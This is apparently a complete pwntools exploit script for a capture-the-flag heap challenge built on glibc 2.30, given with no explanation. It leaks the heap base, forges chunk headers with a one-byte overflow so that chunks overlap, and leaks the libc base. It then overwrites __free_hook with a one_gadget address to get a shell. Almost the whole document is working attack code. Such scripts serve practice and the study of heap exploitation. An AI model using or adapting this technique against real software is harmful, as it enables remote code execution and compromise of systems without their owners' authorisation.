from pwn import*
context.log_level ='DEBUG'
def new(len,name,size,message):
	p.sendlineafter('>>','1')
	p.sendlineafter('length of your name:',str(len))
	p.sendafter('name:',name)
	p.sendlineafter('size of your message:',str(size))
	p.sendafter('please leave your message:',message)
def free(index):
	p.sendlineafter('>>','2')
	p.sendlineafter('index:',str(index))
def edit(index,size,message):
	p.sendlineafter('>>','3')
	p.sendlineafter('index:',str(index))
	p.sendlineafter('size:',str(size))
	p.recvuntil('Hello ')
	leak = u64(p.recvuntil(' you can',drop=True).ljust(8,'\x00'))
	p.sendafter('modify your message >',message)
	return leak
def gift(index,message,again):
	p.sendlineafter('>>','5')
	p.sendlineafter('index:',str(index))
	p.sendafter('modify your message>',message)
	p.sendafter('Here you can modify once again!>',again)
p = process('./main')
libc = ELF('./libc-2.30.so',checksec=False)
new(0,'',0x200,'FMYY\n') #0
new(0,'',0x200,'FMYY\n') #1
free(0)
free(1)
new(0,'',0x200,'FMYY\n')
heap_base = edit(0,4,'FMYY\n') - 0x2A0
log.info('Heap_Base:\t' + hex(heap_base))
#-------------
new(0,'',0xE00,'U'*0xE00) #1
new(0,'',0x80,'FMYY\n') #2*
new(0,'',0x80,'FMYY\n') #3
new(0,'',0x80,'FMYY\n') #4
free(3)
free(1)
new(0,'',0x2F0,'U'*0x2F0) #1
new(0,'',0xAF0,'U'*0xAF0) #3
edit(1,0x309,'\x00'*0x308 + '\xF1')
free(3)
free(4)
new(0,'',0x4E0,'FMYY\n')
new(0,'',0x6D0,'/bin/sh\x00' + '\x00'*(0x600-8) + p64(0) + p64(0x33) + p64(heap_base + 0xA78) + p64(heap_base + 0x190) + '\n') #3
leak = edit(2,8,p64(heap_base + 0x190) + '\n')
libc_base = leak  - 1600 - libc.sym['__malloc_hook'] - 0x10
free_hook = libc_base + libc.sym['__free_hook']
one_gadget = [0xCB79A,0xCB79D,0xCB7A0,0xE926B, 0xE9277]  #Kali 2.30
rce = libc_base + one_gadget[3]
log.info('LIBC:\t' + hex(libc_base))
edit(2,8,p64(free_hook) + '\n')
new(0,'',0x200,p64(rce) + '\n')
free(0)
p.interactive()
